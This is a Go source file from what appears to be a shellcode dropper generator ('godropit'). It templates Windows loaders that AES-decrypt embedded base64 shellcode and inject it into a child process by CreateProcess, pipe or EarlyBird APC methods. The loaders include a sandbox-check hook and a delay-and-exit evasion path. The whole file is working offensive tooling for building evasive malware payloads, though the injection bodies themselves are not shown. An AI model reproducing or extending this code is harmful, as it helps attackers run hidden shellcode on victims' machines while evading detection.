package child

import (
	"html/template"
	"io"

	"github.com/Epictetus24/godropit/pkg/dropfmt"
)

var Droppers = []string{"CreateProcess", "CreateProcessWithPipe", "EarlyBird"}

type ChildDropper struct {
	Funcname  string //FileName
	FileName  string
	KeyStr    string //Key
	Bufstr    string //Base64Shellcodestr
	ChildProc string //Program Proc to Execute in
	Args      string //Args to pass to shellcode exec
	Int       string
	Delay     int
	Dlls      string
	BoxChk    string
	Inject    string
	Export    string
	Domain    string
	Import    string
}

const ChildImports = `import (
	"fmt"
	
	"log"
	"os"
	"syscall"
	"time"
	"unsafe"
	"{{.C}}"

	// Sub Repositories
	"golang.org/x/sys/windows"
	"github.com/Epictetus24/godropit/pkg/box"
)`

var FuncName = "Init"
var Export = "export"

const ChildMain = `
package main

{{.Import}}
func init() {
	{{.BoxChk}}
}
func main() {
	{{.FuncName}}()
}

//{{.Export}} {{.FuncName}}
func {{.FuncName}}() {

	program := "{{.ChildProc}}"
	args := "{{.Args}}"

	bufstring := "{{.Bufstr}}"
	kstring := "{{.KeyStr}}"

	shellcode, err := box.AESDecrypt(kstring, bufstring)
	if err != nil {
		time.Sleep({{.Delay}} * time.Second)
		os.Exit(0)
	}
	{{.Dlls}}
	{{.Inject}}
}
`

// Writes a child template, which usually includes a new process with arguments.
func (cd *ChildDropper) WriteSrc(writer io.Writer) error {
	tmpl, err := template.New("child").Parse(ChildMain)
	if err != nil {
		return err
	}
	cd.Import = ChildImports
	cd.Funcname = FuncName
	cd.Export = ""
	err = tmpl.Execute(writer, cd)
	return nil

}

func (cd *ChildDropper) WriteSharedSrc(writer io.Writer) error {
	tmpl, err := template.New("child").Parse(ChildMain)
	if err != nil {
		return err
	}
	cd.Import = ChildImports
	cd.Funcname = FuncName
	cd.Export = Export
	err = tmpl.Execute(writer, cd)
	return nil

}

func NewChild(args, proc, domain string, delay int) ChildDropper {
	var cD ChildDropper
	cD.Args = args
	cD.ChildProc = proc
	cD.Delay = delay

	_, selected, _ := dropfmt.PromptList(Droppers, "Select the child dropper you would like to use:")

	switch selected {
	case "CreateProcess":
		cD.Dlls = CreateProcessDlls
		cD.Inject = CreateProcess
	case "CreateProcessWithPipe":
		cD.Dlls = CreateProcWithPipeDlls
		cD.Inject = CreateProcWithPipe
	case "EarlyBird":
		cD.Dlls = EarlyBirdDlls
		cD.Inject = EarlyBird
	}

	return cD
}
